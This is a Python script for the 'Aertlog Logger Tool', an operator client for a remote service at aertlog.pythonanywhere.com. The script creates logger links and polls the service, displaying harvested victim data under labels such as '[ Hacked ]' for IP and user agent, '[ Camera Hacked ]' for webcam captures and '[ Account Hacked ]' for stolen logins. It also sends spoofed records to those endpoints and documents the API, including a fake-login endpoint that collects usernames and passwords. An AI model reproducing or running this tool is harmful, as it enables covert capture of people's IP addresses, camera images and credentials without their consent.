import subprocess, os, random, sys, socket, time
try:
	import requests
	print("\033[92m[ + ]\033[0m Requests Module Loaded √")
except:
	print("\033[93m[ ~ ]\033[0m Requests Module Downloading...")
	try:
		subprocess.run("pip install requests".split())
		import requests
		print("\033[92m[ + ]\033[0m Requests Module Downloaded √")
	except:
		print("\033[91m[ - ]\033[0m Requests Module Is Not Downloading ×\nCheck your internet or run 'pip install requests' command on your terminal.")
		sys.exit()
print("\033[93mProve that you are not a robot:\033[0m")
while True:
	mkwns81kf01nd0qkwnd01kdldllll20xnqllllxnwpxo20fkwlakfnwpf8929294llll = str(random.randint(100000, 999999))
	print(f"Activation Code: \033[90m{mkwns81kf01nd0qkwnd01kdldllll20xnqllllxnwpxo20fkwlakfnwpf8929294llll}\033[0m")
	code = input("Enter Code: ")
	if code == mkwns81kf01nd0qkwnd01kdldllll20xnqllllxnwpxo20fkwlakfnwpf8929294llll:
		print("\033[92m[ + ]\033[0m Activated.")
		break
	else:
		print("\033[91m[ - ]\033[0m Code is invalid retry.")
print("\033[93m[ ~ ]\033[0m Testing Internet Connection.")
s = socket.socket()
s.settimeout(3)
try:
	s.connect(("google.com", 80))
	s.sendall(f"GET / HTTP/1.1\r\nHost: google.com\r\n\r\n".encode())
	pack = s.recv(1)
	s.close()
	print("\033[92m[ + ]\033[0m Internet Connection Avaible")
except:
	s.close()
	print("\033[91m[ - ]\033[0m Internet Connection Not Avaible")
	sys.exit()
print("\033[93m[ ~ ]\033[0m Checking Aertlog Server.")
s = socket.socket()
s.settimeout(3)
try:
	s.connect(("aertlog.pythonanywhere.com", 80))
	s.sendall(f"GET / HTTP/1.1\r\nHost: aertlog.pythonanywhere.com\r\n\r\n".encode())
	pack = s.recv(1)
	s.close()
	print("\033[92m[ + ]\033[0m Aertlog Server is Open.")
except:
	s.close()
	print("\033[91m[ - ]\033[0m Aertlog Server is Closed. Try later.")
	sys.exit()

class Aertlog:
	def __init__(self, name):
		self.name = name.replace(" ", "_")
	def create(self):
		try:
			return requests.post("https://aertlog.pythonanywhere.com/api", json={"name": self.name}).text
		except:
			return "Error"
	def show(self):
		try:
			return requests.get("https://aertlog.pythonanywhere.com/show?id="+self.name).text
		except:
			return "Error"
	def troll(self):
		randomIP = str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))
		loginData = {"username": "Troll :D", "password": "Troll :D"}
		print("Sending Fake IP Log...")
		requests.post("https://aertlog.pythonanywhere.com/get?id="+self.name, json={"all": f"ip_addr: {randomIP}\nuser_agent: Troll :D\n"})
		print("Sending Fake Capture Log...")
		requests.post("https://aertlog.pythonanywhere.com/get/capture?id="+self.name, json={"data": f"Troll :D"})
		print("Sending Fake Login Log...")
		requests.post("https://aertlog.pythonanywhere.com/get/login?id="+self.name, json=loginData)
		print("Target is trolled :D")
		

def logger(name):
	client = Aertlog(name)
	client.create()
	while True:
		data = client.show()
		loggers = data.split("Logger URLs:\n")[1].split("\n\n")[0].split("\n")
		logshow = data.split("Show Logs URL: ")[1].split("\n")[0]
		logs = data.split("Logs:\n\n")[1].split("Capture Logs:\n\n")[0].split("\n\n")
		caplogs = data.split("Capture Logs:\n\n")[1].split("\nUser Logs:")[0].split("\n")
		userlogs = data.split("\nUser Logs:\n\n")[1].split("\n")
		data = f"Aertlog Logs Display: \033[92m{logshow}\033[0m\n\n"
		for url, n in zip(loggers, range(len(loggers))):
			data += f"\033[91m[ $ ]\033[0m Logger URL {n+1}: \033[92m{url}\033[0m\n"
		data += "\n"
		for log in logs:
			if log != "Capture ":
				if len(log) >= 2:
					data += f"\033[92m[ Hacked ]\033[0m {log}\n"
		data += "\n"
		for log in caplogs:
			if len(log) >= 2:
				data += f"\033[94m[ Camera Hacked ]\033[0m {log}\n"
		data += "\n"
		for log in userlogs:
			if len(log) >= 2:
				data += f"\033[93m[ Account Hacked ]\033[0m {log}\n"
		data += "\n"
		if os.name == "nt":
			os.system("cls")
		else:
			os.system("clear")
		print(f"Aertlog ID: \033[92m{name}\033[0m")
		print()
		print(data)
		time.sleep(5)

def troll(name):
	client = Aertlog(name)
	client.troll()
	input("[ Enter to menu ]")

def randomID():
	return str(random.randint(100000000, 999999999))

def menu():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")
	print("""\033[91m____ ____ ____ ___ _    ____ ____ 
|__| |___ |__/  |  |    |  | | __ 
|  | |___ |  \  |  |___ |__| |__] 
                                  \033[0m""")
	print("\033[93mAertlog Logger Tool - by aertsimon90 - Website: aertlog.pythonanywhere.com/creator\033[0m\n")
	print("\033[93m[ 1 ]\033[0m Create/Show Logger")
	print("\033[93m[ 2 ]\033[0m Create Logger with Random ID")
	print("\033[93m[ 3 ]\033[0m Logger Troller")
	print("\033[93m[ 4 ]\033[0m Learn Aertlog Endpoint")
	print()
	print("\033[93m[ 0 ]\033[0m Exit")
	print()
	chc = input("Enter Choice: \033[91m")
	print("\033[0m")
	if chc == "1":
		idd = input("Enter Aertlog ID (optional string): ")
		if len(idd) == 0:
			print("Enter a string please")
			time.sleep(2)
			menu()
		elif len(idd) < 5:
			print("Enter a string upper than 5 characters please")
			time.sleep(2)
			menu()
		else:
			logger(idd)
	elif chc == "2":
		logger(randomID())
	elif chc == "3":
		idd = input("Enter Aertlog ID (optional string): ")
		if len(idd) == 0:
			print("Enter a string please")
			time.sleep(2)
		else:
			troll(idd)
		menu()
	elif chc == "4":
		print("""Aertlog API Endpoint Information

1. Create Log Endpoint:
   - Address: https://aertlog.pythonanywhere.com/api
   - HTTP Method: POST
   - Required Data: Request data containing a "name" field in JSON format
   - Example Request:
     {
       "name": "log_name"
     }

2. Show Log Endpoint:
   - Address: https://aertlog.pythonanywhere.com/show
   - HTTP Method: GET
   - Required Data: Log name as the "id" parameter
   - Example Request:
     https://aertlog.pythonanywhere.com/show?id=log_name

3. Troll Log Endpoint:
   - Address: https://aertlog.pythonanywhere.com/get
   - HTTP Method: POST
   - Required Data: Request data containing an "all" field in JSON format
   - Example Request:
     {
       "all": "ip_addr: fake_ip\nuser_agent: Fake User Agent\n"
     }

4. Fake Login Endpoint:
   - Address: https://aertlog.pythonanywhere.com/get/login
   - HTTP Method: POST
   - Required Data: Request data containing "username" and "password" fields in JSON format
   - Example Request:
     {
       "username": "fake_username",
       "password": "fake_password"
     }

5. Fake Capture Endpoint:
   - Address: https://aertlog.pythonanywhere.com/get/capture
   - HTTP Method: POST
   - Required Data: Request data containing a "data" field in JSON format
   - Example Request:
     {
       "data": "fake_capture_data"
     }""")
		input("[ Enter to menu ]")
		menu()
	elif chc == "0":
		sys.exit()
	else:
		menu()

menu()
